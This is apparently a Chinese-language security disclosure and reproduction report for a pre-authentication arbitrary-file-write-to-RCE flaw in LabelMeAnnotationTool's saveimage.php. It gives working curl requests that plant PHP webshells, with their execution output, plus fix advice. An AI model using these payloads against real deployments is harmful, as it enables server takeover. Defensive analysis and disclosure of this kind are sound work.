# LabelMeAnnotationTool 前认证 RCE 漏洞分析与复现报告

- 报告时间：2026-10-10
- 目标项目：`CSAILVision/LabelMeAnnotationTool`（https://github.com/CSAILVision/LabelMeAnnotationTool）
- 测试版本：commit `99e70d42c2cdfc3e3886a07fbafe702466451f22`（2023-03-29）
- 部署方式：官方 `DockerFiles/ubuntu_16.04/Dockerfile`，镜像 `labelmeannotationtool:latest`
- 镜像/容器：`labelmeannotationtool:latest`（容器名 `labelme`，`8080:80`）
- 验证状态：**已部署动态验证**
- 风险等级：**高危（Critical）— 前认证 RCE**

> 本报告替代此前归档的多份分拆材料（原 `preauth_rce_漏洞分析报告.md`、`saveimage-preauth-rce-report.md`、`匿名报告前认证RCE复核报告.md`、`exp.md`），合并为一份完整报告。

---

## 1. 结论摘要

`LabelMeAnnotationTool` 存在**前认证（Pre-auth）远程代码执行**漏洞：

- 漏洞点：`annotationTools/php/saveimage.php`
- 本质：**任意路径 + 任意文件名 + 任意内容的文件写入**，可写入 Web 可执行目录并落盘为 `.php`
- 认证边界：无需登录、无需任何会话/token
- 利用路径：一步写文件 → 一步 HTTP 访问触发执行，**独立可复现**
- 权限结果：以 Web 服务用户 `www-data` 执行任意命令

本地 Docker 环境已完成动态验证：写入 `/var/www/html/rce.php` 后访问执行 `id`，返回 `uid=33(www-data)`。

---

## 2. 目标与环境

### 2.1 目标信息

| 项目 | 内容 |
| --- | --- |
| 源码仓库 | `https://github.com/CSAILVision/LabelMeAnnotationTool` |
| 测试 commit | `99e70d4` |
| 关键文件 | `annotationTools/php/saveimage.php`、`annotationTools/php/createdir.php`、`annotationTools/perl/fetch_image.cgi` |
| 运行依赖 | Apache2 + mod_php（PHP 7.0）+ mod_cgi + Perl（官方 Dockerfile） |

### 2.2 部署环境

- 拉取源码：`/tmp/LabelMeAnnotationTool`（直连 GitHub 超时，改用代理 `http(s)_proxy=http://172.21.224.1:7890`、`all_proxy=socks5://172.21.224.1:7890`）
- 构建镜像：使用官方 `DockerFiles/ubuntu_16.04/Dockerfile`（`ubuntu:16.04` 基础镜像），构建时将代理环境变量透传给构建阶段，`git clone` 步骤成功
- 产物镜像：`labelmeannotationtool:latest`
- 启动容器：

```bash
docker run -d --name labelme -p 8080:80 labelmeannotationtool
```

- 服务入口：`http://localhost:8080/LabelMeAnnotationTool/tool.html`（返回 200，标题 `LabelMe: The open annotation tool`）
- 运行环境：Docker 26.1.5 / WSL2（Linux 6.18.26.1-microsoft-standard-WSL2）

### 2.3 部署后关键环境事实

- Apache 模块：`php7_module`、`cgi_module`、`include_module` 均已启用
- `annotationTools/php/globalvariables.php` 由 Makefile 生成，容器内实际值：

```php
$TOOLHOME = "/var/www/html/LabelMeAnnotationTool/";
```

- 权限：`drwxrwxrwx www-data www-data /var/www/html/LabelMeAnnotationTool/annotationTools/php`（Makefile 中 `chmod -R 777`）
- PHP 配置：`disable_functions`、`open_basedir` 均未限制，`system()` 可用

---

## 3. 漏洞成因（源码）

### 3.1 `annotationTools/php/saveimage.php`

```php
<?php include('globalvariables.php'); ?>
<?php
// saveimage.php:6-27
if ( isset($_POST["image"]) && !empty($_POST["image"]) ) {
    define('UPLOAD_DIR', $_POST["uploadDir"]);          // 可控路径
    $dataURL = $_POST["image"];                          // 可控内容
    $parts = explode(',', $dataURL);
    $data = $parts[1];
    $data = base64_decode($data);                        // 仅 base64 解码，无格式校验
    $file = $TOOLHOME . UPLOAD_DIR . $_POST["name"];     // 可控文件名，直接拼接
    $success = file_put_contents($file, $data);          // 文件写入 sink
    print $success ? $file : 'Unable to save this image.'; // 回显绝对路径
}
```

问题点：

1. **无认证校验**：未检查 session / token / 用户。
2. **写入路径可控**：`uploadDir` 与 `name` 未做规范化、白名单或目录约束，支持 `../` 路径穿越。
3. **无后缀白名单**：允许写入 `.php`。
4. **无内容校验**：仅 `explode(',')` + `base64_decode`，不校验真实图片类型。
5. **回显落点**：直接返回服务端绝对路径，便于攻击者确认写入位置。

### 3.2 辅助点 `annotationTools/php/createdir.php`

```php
$dirURL = $TOOLHOME . $_POST["urlData"];
if (!file_exists($dirURL)) {
    mkdir($dirURL, 0777, true);   // 路径可控的目录创建，0777
}
```

同样无认证、无路径约束，可作辅助利用（预创建目录）。

### 3.3 认证面核验

服务端 PHP/Perl 脚本均无会话校验；前端用户名仅来自 URL/Cookie，默认 `anonymous`（`annotationTools/js/sign_in.js`、`globals.js`）。上述入口全部为**前认证可达**。

---

## 4. 完整利用链

### 4.1 主链：任意文件写入 → RCE（独立、稳定）

1. 前认证 `POST /LabelMeAnnotationTool/annotationTools/php/saveimage.php`
2. 参数控制写入路径：`uploadDir=../` + `name=rce.php` → 落点 `$TOOLHOME/../rce.php = /var/www/html/rce.php`
3. `image` 提交 base64 编码的 PHP 代码（无需真实图片）
4. HTTP 访问落盘脚本触发执行

请求示例：

```http
POST /LabelMeAnnotationTool/annotationTools/php/saveimage.php HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

uploadDir=../&name=rce.php&image=data:image/png;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

其中 base64 解码为 `<?php system($_GET['c']); ?>`。随后 `GET /rce.php?c=id` 即可执行命令。

### 4.2 次级链：`fetch_image.cgi` / `fetch_prev_image.cgi` 命令拼接（条件成立）

```perl
# fetch_image.cgi:20,27
my $fname = $LM_HOME . "annotationCache/DirLists/$collection.txt";
if(!open(FP,$fname)) { print "Status: 404\n\n"; return; }   # 前置存在性约束
open(NUMLINES,"wc -l $fname |");                            # 命令拼接语义
```

`$collection` 可控并拼入 shell 命令，具备命令注入语义，但受前置 `open(FP,$fname)` 成功条件约束，单独利用门槛较高；可与主链组合（先写入 `annotationCache/DirLists/` 下同名文件）解锁。相较主链，属次级价值路径。

---

## 5. 动态复现与证据

以下均在本地容器 `labelme`（`127.0.0.1:8080`）实测。注意应用部署在 `/LabelMeAnnotationTool/` 子目录下，请求需带该前缀。

### 5.1 步骤一：路径遍历写入 Web 根目录

```bash
curl -s -X POST "http://127.0.0.1:8080/LabelMeAnnotationTool/annotationTools/php/saveimage.php" \
  --data-urlencode "uploadDir=../" \
  --data-urlencode "name=rce.php" \
  --data-urlencode "image=data:image/png;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
```

响应（HTTP 200，回显落点）：

```text
/var/www/html/LabelMeAnnotationTool/../rce.php
```

### 5.2 步骤二：访问触发执行

```bash
curl -s "http://127.0.0.1:8080/rce.php?c=id"
```

输出：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

多命令（`id; whoami; hostname; uname -a`）：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
975fed9615e7
Linux 975fed9615e7 6.18.26.1-microsoft-standard-WSL2 ... x86_64 GNU/Linux
```

### 5.3 步骤三：`exp.py` 式 webshell 复现

写入 webshell（`uploadDir` 为空 → 落点项目根目录）：

```bash
curl -s -X POST "http://127.0.0.1:8080/LabelMeAnnotationTool/annotationTools/php/saveimage.php" \
  --data-urlencode "image=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==" \
  --data-urlencode "name=shell.php" \
  --data-urlencode "uploadDir="
# -> /var/www/html/LabelMeAnnotationTool/shell.php

curl -s -X POST "http://127.0.0.1:8080/LabelMeAnnotationTool/shell.php" --data-urlencode '1=system("id");'
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 说明：归档的 `exp/exp.py` 默认 `url='http://127.0.0.1'` 并以 `/annotationTools/...` 为根路径，隐含“应用部署在 Web 根”的假设；本环境在 `/LabelMeAnnotationTool/` 子目录，实际复现需带该前缀。

### 5.4 落盘取证（容器内）

```text
-rw-r--r-- 1 www-data www-data 25 ... /var/www/html/LabelMeAnnotationTool/shell.php
-rw-r--r-- 1 www-data www-data 28 ... /var/www/html/rce.php

# /var/www/html/rce.php
<?php system($_GET['c']); ?>
# /var/www/html/LabelMeAnnotationTool/shell.php
<?php @eval($_POST[1]);?>
```

### 5.5 清理验证

删除两个脚本后：`/rce.php` → 404，`/LabelMeAnnotationTool/shell.php` → 404，`tool.html` → 200（服务正常）。

---

## 6. 修复建议

按优先级：

1. **P0**：下线或强制鉴权 `saveimage.php` / `createdir.php` 等写操作接口。
2. **P0**：`saveimage.php` 固定写入目录与后缀（仅 `.png`），校验真实图片类型（如 `getimagesizefromstring`），拒绝 `..`、绝对路径与控制字符。
3. **P1**：移除 `fetch_image.cgi` / `fetch_prev_image.cgi` 中 `open(..., "cmd |")` 的 shell 拼接，改用无 shell 的安全实现。
4. **P1**：Web 层禁止上传/可写目录执行脚本（如 `php_admin_flag engine off`）。
5. **P1**：移除 Makefile 中 `chmod -R 777 ./annotationTools/php`，改最小权限。
6. **P2**：取消把服务端绝对路径回显给客户端。

---

## 7. 判定

- 结论：**存在前认证 RCE**
- 主漏洞：`annotationTools/php/saveimage.php`（任意文件写入 → RCE）
- 主利用链：`POST saveimage.php` → 写入 `.php` → HTTP 访问触发执行
- 认证前提：无
- 攻击复杂度：低 / 稳定性：高 / 影响：服务器端任意代码执行（`www-data`）
- 综合评级：**Critical**

---

## 8. 附：部署与复现步骤小结

```bash
# 1) 拉取源码（直连不可达时挂代理）
export https_proxy=http://172.21.224.1:7890 http_proxy=http://172.21.224.1:7890 all_proxy=socks5://172.21.224.1:7890
git clone --depth 1 https://github.com/CSAILVision/LabelMeAnnotationTool.git /tmp/LabelMeAnnotationTool

# 2) 构建镜像（透传代理给构建阶段）
cd /tmp/LabelMeAnnotationTool/DockerFiles/ubuntu_16.04
docker build -t labelmeannotationtool:latest .

# 3) 启动
docker run -d --name labelme -p 8080:80 labelmeannotationtool:latest

# 4) 复现（见第 5 节）
```

访问入口：`http://localhost:8080/LabelMeAnnotationTool/tool.html`
